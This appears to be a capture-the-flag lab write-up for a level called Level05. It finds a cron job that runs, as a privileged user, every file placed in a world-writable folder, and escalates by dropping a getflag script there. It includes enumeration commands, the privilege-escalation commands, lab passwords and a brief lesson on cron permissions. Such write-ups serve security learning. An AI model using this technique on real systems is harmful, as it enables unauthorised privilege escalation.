# Solve Level05
pass : ne2searoevaevoem4ov4ar8ap


### Description
- ```(find / -user flag05 -type f 2>/dev/null) | grep -v proc``` ==> only file : '/usr/sbin/openarenaserver'
- when we connect we have a message "You have a new mail."
  - on linux mails are in /var/mail/user
  - other way to find the mail ```(find / -type f -iname level* 2>/dev/null) | grep -v rof``` help to find `var/mail/level05`


### diggin on /var/mail/level05
- only this : `*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
    - first part is a cron pattern telling "At every 2nd minute run su" ```man cron``` [crontab][fd1] [advices][fd2]
    - the cron calls openarenaserver as flag05

### /usr/sbin/openarenaserver
`-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver`
  - he execute each file in the folder `/opt/openarenaserver` with ```bash -x #x is tracing mode``` then remove the file
  - maybe we can put a file to execute in /opt/openarenaserver (the folder is set 777)


## Solution
```bash
echo "getflag > /tmp/test" > /opt/openarenaserver/test
# wait for cron job execution (2 minutes max)
cat /tmp/test
```

- no flag
- level06 : viuaaale9huek52boumoomioc


## Resolve problem
- be aware about cron job and all rights they can give ==> don't give write and execute to everybody

[fd1]: https://crontab.guru/crontab.5.html
[fd2]: https://serverfault.com/questions/449651/why-is-my-crontab-not-working-and-how-can-i-troubleshoot-it